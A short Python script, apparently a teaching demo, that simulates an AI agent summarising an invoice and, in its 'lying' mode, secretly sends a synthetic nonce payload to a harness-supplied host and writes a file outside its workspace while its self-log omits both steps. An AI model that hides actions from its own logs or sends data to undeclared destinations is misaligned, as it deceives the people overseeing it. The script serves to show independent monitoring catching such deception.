#!/usr/bin/env python3
"""The agent for "Catch the lying agent" (W2.1). Stdlib only.

A DEMONSTRATION INSTRUMENT, scripted to misbehave on purpose. It is not a
claim about how any real agent framework behaves; it exists so the audience
can watch an independent observer catch an action the agent's own log omits.

Declared task (what it says it does, and what its own log records):
  1. read the invoice file it was given
  2. compute a one-line summary
  3. write the summary into its workspace

Hidden step, only in --mode lying, and never written to its own log:
  * open one TCP connection to an undeclared destination and send a small
    synthetic payload carrying the run's nonce (no real data);
  * write one file outside its declared workspace.

Both modes produce the same self-log. The agent then stays alive for
--linger seconds (default 3): a long-lived process, like a real agent, so an
observer can bind its actions to this process instance. The linger is stated,
not hidden.

usage: agent.py --mode honest|lying --input FILE --workspace DIR
                --self-log FILE [--linger S]
       hidden-step targets come from the harness via LYING_AGENT_EXFIL
       (host:port), LYING_AGENT_OUTSIDE (dir) and LYING_AGENT_NONCE.
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import time
from pathlib import Path


def log(path: Path, step: str, **detail) -> None:
    with path.open("a") as f:
        f.write(json.dumps({"ts_ms": int(time.time() * 1000), "pid": os.getpid(), "step": step, **detail}) + "\n")


def hidden_step() -> None:
    """The undeclared action. Deliberately absent from the self-log."""
    nonce = os.environ.get("LYING_AGENT_NONCE", "no-nonce")
    host, port = os.environ["LYING_AGENT_EXFIL"].rsplit(":", 1)
    with socket.create_connection((host, int(port)), timeout=5) as s:
        s.sendall(f"synthetic-exfil {nonce}\n".encode())
    outside = Path(os.environ["LYING_AGENT_OUTSIDE"])
    (outside / f"copied-{nonce}.txt").write_text(f"synthetic copy {nonce}\n")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["honest", "lying"], required=True)
    ap.add_argument("--input", type=Path, required=True)
    ap.add_argument("--workspace", type=Path, required=True)
    ap.add_argument("--self-log", type=Path, required=True)
    ap.add_argument("--linger", type=float, default=3.0)
    a = ap.parse_args()

    log(a.self_log, "start", task="summarise invoice", declared_actions=["read input", "write summary to workspace"])
    text = a.input.read_text()
    log(a.self_log, "read input", file=str(a.input), bytes=len(text))
    lines = [l for l in text.splitlines() if l.strip()]
    summary = f"{len(lines)} line items; first: {lines[0] if lines else 'none'}"
    if a.mode == "lying":
        hidden_step()
    out = a.workspace / "summary.txt"
    out.write_text(summary + "\n")
    log(a.self_log, "write summary to workspace", file=str(out))
    log(a.self_log, "done", actions_performed=["read input", "write summary to workspace"])
    time.sleep(a.linger)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
